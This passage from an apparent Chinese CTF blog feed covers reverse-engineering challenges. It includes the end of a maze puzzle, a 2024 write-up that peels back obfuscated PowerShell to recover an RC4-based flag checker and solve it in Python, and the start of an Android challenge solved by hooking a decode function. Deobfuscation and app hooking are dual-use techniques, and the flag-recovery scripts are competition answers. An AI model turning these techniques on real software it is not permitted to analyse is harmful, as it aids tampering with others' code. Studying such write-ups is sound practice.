class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110000011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111000111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111010111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111010111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111000111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>3是箱子，4是终点，2是出生点</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">2</span></span><br><span class="line"><span class="attribute">4</span>+<span class="number">8</span></span><br><span class="line"><span class="attribute">13</span></span><br><span class="line"><span class="attribute">9</span></span><br><span class="line"><span class="attribute">21</span></span><br><span class="line"><span class="attribute">6</span>+<span class="number">7</span></span><br><span class="line"><span class="attribute">25</span></span><br><span class="line"><span class="attribute">15</span>+<span class="number">5</span>+<span class="number">11</span></span><br><span class="line"><span class="attribute">3</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">212139211325313</span></span><br></pre></td></tr></table></figure><p>md5加头即可</p><h2 id="snake">snake</h2>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网拟态2024复现</title>
      <link href="/posts/44d650c4.html"/>
      <url>/posts/44d650c4.html</url>
      
        <content type="html"><![CDATA[<h2 id="a-game">a_game</h2><p>坑，我找了好久胜利的时候的条件，没想到是在退出的时候检查的QAQ，不过学到了注册表的相关函数，</p><p><img src="https://s2.loli.net/2024/11/01/h3wZqCtpuPBMymd.png" alt="image-20241101003113092"></p><p>把这里解密的脚本直接dump然后每次把最前面的函数名改成Write-Out输出没有混淆的版本，</p><p>比如：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Write-Output</span>( ( [<span class="type">RuntIme.INteroPsErviCEs.maRSHal</span>]::PTrtostriNGAUTo( [<span class="type">rUNtIme.inteRopServIces.MarshAl</span>]::seCuREsTrinGtobStr( <span class="variable">$</span>(<span class="string">&#x27;76492d1116743f0423413b160省略base64内容&#x27;</span> | <span class="built_in">conveRTTo-SECureSTrinG</span>  <span class="literal">-K</span> (<span class="number">94</span>..<span class="number">117</span>)) ) ))) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这时可以直接在pwsh里执行，然后得到输出的代码，继续解密</p><p>然后继续直到解密出来代码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enenenenene</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        <span class="variable">$plaintextBytes</span>,</span><br><span class="line">        <span class="variable">$keyBytes</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># Initialize S and KSA</span></span><br><span class="line">    <span class="variable">$S</span> = <span class="number">0</span>..<span class="number">255</span></span><br><span class="line">    <span class="variable">$j</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$S</span>[<span class="variable">$i</span>] + <span class="variable">$keyBytes</span>[<span class="variable">$i</span> % <span class="variable">$keyBytes</span><span class="type">.Length</span>]) % <span class="number">256</span></span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$S</span>[<span class="variable">$i</span>]</span><br><span class="line">        <span class="variable">$S</span>[<span class="variable">$i</span>] = <span class="variable">$S</span>[<span class="variable">$j</span>]</span><br><span class="line">        <span class="variable">$S</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PRGA and encryption</span></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line">    <span class="variable">$j</span> = <span class="number">0</span></span><br><span class="line">    <span class="variable">$ciphertextBytes</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> <span class="operator">-lt</span> <span class="variable">$plaintextBytes</span>.Length; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$i</span> = (<span class="variable">$i</span> + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$S</span>[<span class="variable">$i</span>]) % <span class="number">256</span></span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$S</span>[<span class="variable">$i</span>]</span><br><span class="line">        <span class="variable">$S</span>[<span class="variable">$i</span>] = <span class="variable">$S</span>[<span class="variable">$j</span>]</span><br><span class="line">        <span class="variable">$S</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span></span><br><span class="line">        <span class="variable">$t</span> = (<span class="variable">$S</span>[<span class="variable">$i</span>] + <span class="variable">$S</span>[<span class="variable">$j</span>]) % <span class="number">256</span></span><br><span class="line">        <span class="variable">$ciphertextBytes</span> += (<span class="variable">$plaintextBytes</span>[<span class="variable">$k</span>] <span class="operator">-bxor</span> <span class="variable">$S</span>[<span class="variable">$t</span>])</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Return ciphertext as a string</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ciphertextBytes</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enenenenene1</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        <span class="variable">$inputbyte</span></span><br><span class="line">    )</span><br><span class="line">    <span class="variable">$key</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x70, <span class="number">0</span>x6f, <span class="number">0</span>x77, <span class="number">0</span>x65, <span class="number">0</span>x72)</span><br><span class="line">    <span class="variable">$encryptedText</span> = <span class="selector-tag">@</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> <span class="operator">-lt</span> <span class="variable">$inputbyte</span>.Length; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$encryptedText</span> = enenenenene <span class="literal">-plaintextBytes</span> <span class="variable">$inputbyte</span> <span class="literal">-keyBytes</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="variable">$key</span> = enenenenene <span class="literal">-plaintextBytes</span> <span class="variable">$key</span> <span class="literal">-keyBytes</span> <span class="variable">$encryptedText</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encryptedText</span> + <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enenenenene2</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        <span class="variable">$inputbyte</span></span><br><span class="line">    )</span><br><span class="line">    <span class="variable">$key</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x70, <span class="number">0</span>x30, <span class="number">0</span>x77, <span class="number">0</span>x65, <span class="number">0</span>x72)</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> <span class="operator">-lt</span> <span class="variable">$inputbyte</span>.Length; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$inputbyte</span>[<span class="variable">$k</span>] = <span class="variable">$inputbyte</span>[<span class="variable">$k</span>] + <span class="variable">$key</span>[<span class="variable">$k</span> % <span class="variable">$key</span><span class="type">.Length</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$inputbyte</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enenenenene3</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        <span class="variable">$inputbyte</span></span><br><span class="line">    )</span><br><span class="line">    <span class="variable">$key</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x70, <span class="number">0</span>x30, <span class="number">0</span>x77, <span class="number">0</span>x33, <span class="number">0</span>x72)</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> <span class="operator">-lt</span> <span class="variable">$inputbyte</span>.Length; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$inputbyte</span>[<span class="variable">$k</span>] = <span class="variable">$inputbyte</span>[<span class="variable">$k</span>] * <span class="variable">$key</span>[<span class="variable">$k</span> % <span class="variable">$key</span><span class="type">.Length</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$inputbyte</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$registryPath</span> = <span class="string">&#x27;HKCU:\Software\PacManX&#x27;</span></span><br><span class="line"><span class="variable">$valueName</span> = <span class="string">&#x27;MYFLAG&#x27;</span></span><br><span class="line"><span class="variable">$value</span> = <span class="built_in">Get-ItemPropertyValue</span> <span class="variable">$registryPath</span> <span class="variable">$valueName</span></span><br><span class="line"><span class="variable">$plaintext</span> = <span class="selector-tag">@</span>(<span class="variable">$value</span>) | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_</span></span><br><span class="line">    <span class="variable">$plaintext</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$input</span>.Length; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$plaintext</span> += [<span class="built_in">int</span>][<span class="built_in">char</span>]<span class="variable">$input</span>[<span class="variable">$i</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$plaintext</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$plaintext</span>.Length <span class="operator">-ne</span> <span class="number">36</span>) &#123;</span><br><span class="line">    <span class="built_in">Set-Content</span> <span class="literal">-Path</span> <span class="string">&quot;log.txt&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    <span class="keyword">exit</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$encrypted1Text</span> = enENenenene2 <span class="literal">-inputbyte</span> (enenenENene2 <span class="literal">-inputbyte</span> (enenenenene3 <span class="literal">-inputbyte</span> (Enenenenene2 <span class="literal">-inputbyte</span> (enenenenene2 <span class="literal">-inputbyte</span> (enenenenene2 <span class="literal">-inputbyte</span> (enenenenene1 <span class="literal">-input</span> <span class="variable">$plaintext</span>))))))</span><br><span class="line"><span class="variable">$result</span> = <span class="selector-tag">@</span>(<span class="number">38304</span>, <span class="number">8928</span>, <span class="number">43673</span>, <span class="number">25957</span> , <span class="number">67260</span>, <span class="number">47152</span>, <span class="number">16656</span>, <span class="number">62832</span> , <span class="number">19480</span> , <span class="number">66690</span>, <span class="number">40432</span>, <span class="number">15072</span> , <span class="number">63427</span> , <span class="number">28558</span> , <span class="number">54606</span>, <span class="number">47712</span> , <span class="number">18240</span> , <span class="number">68187</span> , <span class="number">18256</span>, <span class="number">63954</span> , <span class="number">48384</span>, <span class="number">14784</span>, <span class="number">60690</span> , <span class="number">21724</span> , <span class="number">53238</span> , <span class="number">64176</span> , <span class="number">9888</span> , <span class="number">54859</span> , <span class="number">23050</span> , <span class="number">58368</span> , <span class="number">46032</span> , <span class="number">15648</span> , <span class="number">64260</span> , <span class="number">17899</span> , <span class="number">52782</span> , <span class="number">51968</span> , <span class="number">12336</span> , <span class="number">69377</span> , <span class="number">27844</span> , <span class="number">43206</span> , <span class="number">63616</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> <span class="operator">-lt</span> <span class="variable">$result</span>.Length; <span class="variable">$k</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$encrypted1Text</span>[<span class="variable">$k</span>] <span class="operator">-ne</span> <span class="variable">$result</span>[<span class="variable">$k</span>]) &#123;</span><br><span class="line">        <span class="built_in">Set-Content</span> <span class="literal">-Path</span> <span class="string">&quot;log.txt&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Set-Content</span> <span class="literal">-Path</span> <span class="string">&quot;log.txt&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;RIGHT&quot;</span></span><br></pre></td></tr></table></figure><p>然后直接逆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">plaintext_bytes, key_bytes</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key_bytes[i % <span class="built_in">len</span>(key_bytes)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    ciphertext_bytes = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext_bytes)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        ciphertext_bytes.append(plaintext_bytes[k] ^ S[t])</span><br><span class="line">    <span class="keyword">return</span> ciphertext_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_layer_rc4_encrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    key = [<span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>]</span><br><span class="line">    encrypted_text = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        encrypted_text = rc4_encrypt(input_bytes, key)</span><br><span class="line">        key = rc4_encrypt(key, encrypted_text)</span><br><span class="line">    <span class="keyword">return</span> encrypted_text + key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">additive_encrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    key = [<span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        input_bytes[k] = (input_bytes[k] + key[k % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span>  <span class="comment"># Ensure bytes are in range 0-255</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiplicative_encrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    key = [<span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x33</span>, <span class="number">0x72</span>]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        input_bytes[k] = (input_bytes[k] * key[k % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span>  <span class="comment"># Ensure bytes are in range 0-255</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes</span><br><span class="line"></span><br><span class="line">result = [<span class="number">38304</span>, <span class="number">8928</span>, <span class="number">43673</span>, <span class="number">25957</span> , <span class="number">67260</span>, <span class="number">47152</span>, <span class="number">16656</span>, <span class="number">62832</span> , <span class="number">19480</span> , <span class="number">66690</span>, <span class="number">40432</span>, <span class="number">15072</span> , <span class="number">63427</span> , <span class="number">28558</span> , <span class="number">54606</span>, <span class="number">47712</span> , <span class="number">18240</span> , <span class="number">68187</span> , <span class="number">18256</span>, <span class="number">63954</span> , <span class="number">48384</span>, <span class="number">14784</span>, <span class="number">60690</span> , <span class="number">21724</span> , <span class="number">53238</span> , <span class="number">64176</span> , <span class="number">9888</span> , <span class="number">54859</span> , <span class="number">23050</span> , <span class="number">58368</span> , <span class="number">46032</span> , <span class="number">15648</span> , <span class="number">64260</span> , <span class="number">17899</span> , <span class="number">52782</span> , <span class="number">51968</span> , <span class="number">12336</span> , <span class="number">69377</span> , <span class="number">27844</span> , <span class="number">43206</span> , <span class="number">63616</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_layer_rc4_decrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    <span class="comment"># key = [0x70, 0x6f, 0x77, 0x65, 0x72]</span></span><br><span class="line">    <span class="comment"># input_bytes = input_bytes[:-5]</span></span><br><span class="line">    input_bytes,key_last = input_bytes[:-<span class="number">5</span>],input_bytes[-<span class="number">5</span>:]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        key_last = rc4_encrypt(key_last, input_bytes)</span><br><span class="line">        input_bytes = rc4_encrypt(input_bytes, key_last)</span><br><span class="line">        <span class="comment"># print(input_bytes)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(input_byte&lt;=<span class="number">127</span> <span class="keyword">and</span> input_byte&gt;=<span class="number">32</span> <span class="keyword">for</span> input_byte <span class="keyword">in</span> input_bytes):</span><br><span class="line">                pl(input_bytes,<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">additive_decrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    key = [<span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        input_bytes[k] = (input_bytes[k] - key[k % <span class="built_in">len</span>(key)])  <span class="comment"># Ensure bytes are in range 0-255</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiplicative_decrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    key = [<span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x33</span>, <span class="number">0x72</span>]</span><br><span class="line">    <span class="comment"># inv_key = [mod_inverse(key[i], 0xff) for i in range(5)]</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        <span class="keyword">assert</span> input_bytes[k] % key[k % <span class="built_in">len</span>(key)] == <span class="number">0</span></span><br><span class="line">        input_bytes[k] = (input_bytes[k] // key[k % <span class="built_in">len</span>(key)])  <span class="comment"># Ensure bytes are in range 0-255</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = additive_decrypt(additive_decrypt(result))</span><br><span class="line">res = multiplicative_decrypt(res)</span><br><span class="line">res = additive_decrypt(additive_decrypt(res))</span><br><span class="line">res = additive_decrypt(res)</span><br><span class="line">res = multi_layer_rc4_decrypt(res)</span><br><span class="line"><span class="comment"># print(res)</span></span><br></pre></td></tr></table></figure><h2 id="servers">servers</h2><p>打开应用，发现有两个按钮input和check，对应了两个onClick函数</p><p><img src="https://s2.loli.net/2024/11/01/rag4cT3hXQJMlso.png" alt="image-20241101004406675"></p><p>很明显用了动态加载类。尝试先对decode函数进行hook</p><p>得到</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">myclass.decode is called: <span class="attribute">str</span>=RtHTxaKcRXIdES5ktXugN2ww1d91EMp/QOxAh8bV</span><br><span class="line">myclass.decode <span class="attribute">result</span>=android.content.ContextWrapper</span><br><span class="line">myclass.decode is called: <span class="attribute">str</span>=VMvWxbmmRC4IFyN1</span><br><span class="line">myclass.decode <span class="attribute">result</span>=startService</span><br><span class="line">myclass.decode is called: <span class="attribute">str</span>=RtHTxaKcRXIdES5ktXugN2ww1d91EMp/QOxAh8bV</span><br><span class="line">myclass.decode <span class="attribute">result</span>=android.content.ContextWrapper</span><br><span class="line">myclass.decode is called: <span class="attribute">str</span>=VMvYx56QUyoXHSU=</span><br><span class="line">myclass.decode <span class="attribute">result</span>=stopService</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">    EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), <span class="keyword">new</span> <span class="title class_">OnApplyWindowInsetsListener</span>() &#123; <span class="comment">// from class: com.nobody.Serv1ce.MainActivity$$ExternalSyntheticLambda0</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// androidx.core.view.OnApplyWindowInsetsListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> WindowInsetsCompat <span class="title function_">onApplyWindowInsets</span><span class="params">(View view, WindowInsetsCompat windowInsetsCompat)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> MainActivity.lambda$onCreate$<span class="number">0</span>(view, windowInsetsCompat);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.ClickMe);</span><br><span class="line">    <span class="type">Button</span> <span class="variable">button2</span> <span class="operator">=</span> (Button) findViewById(R.id.ClickMe1);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Intent</span> <span class="variable">intent</span> <span 